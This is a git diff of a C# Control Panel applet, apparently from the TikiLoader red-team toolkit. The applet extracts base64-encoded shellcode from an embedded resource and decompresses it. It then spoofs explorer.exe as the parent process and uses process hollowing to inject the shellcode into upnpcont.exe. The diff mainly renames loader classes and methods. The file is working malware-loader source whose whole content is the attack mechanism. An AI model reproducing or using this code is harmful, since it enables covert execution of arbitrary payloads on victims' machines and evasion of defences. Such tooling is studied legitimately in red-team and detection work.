@@ -3,8 +3,9 @@ using System.IO;
 using System.Reflection;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using RGiesecke.DllExport;
+
 using TikiLoader;
+using RGiesecke.DllExport;
 
 public class TikiCpl
 {
@@ -21,6 +22,7 @@ public class TikiCpl
         }
 
     }
+
     private delegate IntPtr GetPebDelegate();
 
     public static int FindProcessPid(string process)
@@ -38,16 +40,16 @@ public class TikiCpl
                 pid = proc.Id;
             }
         }
+
         return pid;
     }
 
     [DllExport("CPlApplet", CallingConvention = CallingConvention.StdCall)]
     public unsafe static IntPtr CPlApplet()
     {
-
         string scode = ExtractResource("TikiCpl.Resource.txt");
         byte[] blob = Convert.FromBase64String(scode);
-        byte[] shellcode = Hollower.DecompressShellcode(blob);
+        byte[] shellcode = Generic.DecompressShellcode(blob);
 
         if (shellcode.Length == 0) return IntPtr.Zero;
             int ppid = FindProcessPid("explorer");
@@ -56,13 +58,12 @@ public class TikiCpl
                 Environment.Exit(1);
             }
 
-            var ldr = new Hollower();
-
         try
         {
+            var hollower = new Hollower();
             // Change the binary you want to inject shellcode into
-            string binary = "C:\\windows\\system32\\upnpcont.exe";
-            ldr.Load(binary, shellcode, ppid);
+            string binary = @"C:\windows\system32\upnpcont.exe";
+            hollower.Hollow(binary, shellcode, ppid);
             return IntPtr.Zero;
         }
         catch
